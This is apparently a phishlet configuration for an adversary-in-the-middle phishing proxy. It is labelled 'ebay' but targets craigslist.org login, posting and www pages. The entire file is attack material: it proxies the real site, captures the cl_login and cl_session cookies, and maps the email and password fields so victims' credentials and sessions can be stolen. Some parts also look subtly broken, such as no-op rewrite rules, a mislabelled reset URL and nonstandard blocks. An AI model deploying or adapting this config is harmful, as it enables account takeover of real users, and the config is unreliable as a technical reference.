---
name: ebay
author: Anon0369G
min_ver: 3.0.0
proxy_hosts:
  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'craigslist.org', session: true, is_landing: true}
  - {phish_sub: 'post', orig_sub: 'post', domain: 'craigslist.org', session: true, is_landing: false}
  #- {phish_sub: 'wapi', orig_sub: 'wapi', domain: 'craigslist.org', session: true, is_landing: false}
  #- {phish_sub: 'capi', orig_sub: 'capi', domain: 'craigslist.org', session: true, is_landing: false}
  #- {phish_sub: 'sapi', orig_sub: 'sapi', domain: 'craigslist.org', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'craigslist.org', session: true, is_landing: false}


sub_filters:
  # Rewrite for accounts.craigslist.org
  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.{hostname}/', replace: 'https://accounts.{hostname}/', mimes: ['text/html']}
  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.{hostname}/login', replace: 'https://accounts.{hostname}/login', mimes: ['text/html']}
  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.{hostname}/reset', replace: 'https://accounts.{hostname}/reset', mimes: ['text/html']}
  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.{hostname}/signup', replace: 'https://accounts.{hostname}/signup', mimes: ['text/html']}
  # Rewrite for post.craigslist.org
  - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.{hostname}/', replace: 'https://post.{hostname}/', mimes: ['text/html']}
  - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.{hostname}/c/lax', replace: 'https://post.{hostname}/c/lax', mimes: ['text/html']}
  # Rewrite for wapi.craigslist.org
  - {triggers_on: 'wapi.craigslist.org', orig_sub: 'wapi', domain: 'craigslist.org', search: 'https://wapi.{hostname}/', replace: 'https://wapi.{hostname}/', mimes: ['application/json']}
  # Rewrite for capi.craigslist.org
  - {triggers_on: 'capi.craigslist.org', orig_sub: 'capi', domain: 'craigslist.org', search: 'https://capi.{hostname}/', replace: 'https://capi.{hostname}/', mimes: ['application/json']}
  # Rewrite for sapi.craigslist.org
  - {triggers_on: 'sapi.craigslist.org', orig_sub: 'sapi', domain: 'craigslist.org', search: 'https://sapi.{hostname}/', replace: 'https://sapi.{hostname}/', mimes: ['application/json']}
  # Rewrite help pages
  - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: 'https://{hostname}/about/help/', replace: 'https://{hostname}/about/help/', mimes: ['text/html']}


auth_tokens:
  - domain: .craigslist.org
    keys:
      - cl_b
      - cl_def_hp
      - cl_login
      - cl_session
    type: cookie
    session_keys:
      - cl_login
      - cl_session
      
auth_urls:
  - https://accounts.craigslist.org/login
  
urls:
  login: https://accounts.craigslist.org/login
  logout: https://accounts.craigslist.org/logout
  MFA: https://accounts.craigslist.org/login/onetime
  password_reset: https://accounts.craigslist.org/signup
  account_recovery: https://accounts.craigslist.org/reset
  
force_post:
  - domain: 'accounts.craigslist.org'
    path: '/login'
    type: post
    force:
      - key: 'inputEmailHandle'
        value: '{{credentials.username}}'
      - key: 'inputPassword'
        value: '{{credentials.password}}'

proxy_headers:
  - name: 'User-Agent'
  - name: 'Accept-Language'
  - name: 'Referer'
  - name: 'Sec-Fetch-Site'
  - name: 'Sec-Fetch-Mode'
  - name: 'Sec-Fetch-Dest'
  - name: 'Accept-Encoding'
  - name: 'Sec-Ch-Ua'

credentials:
  username:
    key: 'inputEmailHandle'
    type: 'text'
    required: true
    search: 'inputEmailHandle'
  password:
    key: 'inputPassword'
    type: 'password'
    required: true
    search: 'inputPassword'
    
login:
  domain: 'accounts.craigslist.org'  # The target domain for the login form
  path: '/login'  # Path for login form submission
  method: 'POST'  # HTTP method for form submission
  form:
    fields:
      - { name: 'inputEmailHandle', required: true }    # Username field
      - { name: 'inputPassword', required: true }      # Password field

session_handling:
  session_lifetime: 3600              # Time in seconds for session expiry
  session_cookie: 'cl_session'        # Session tracking cookie
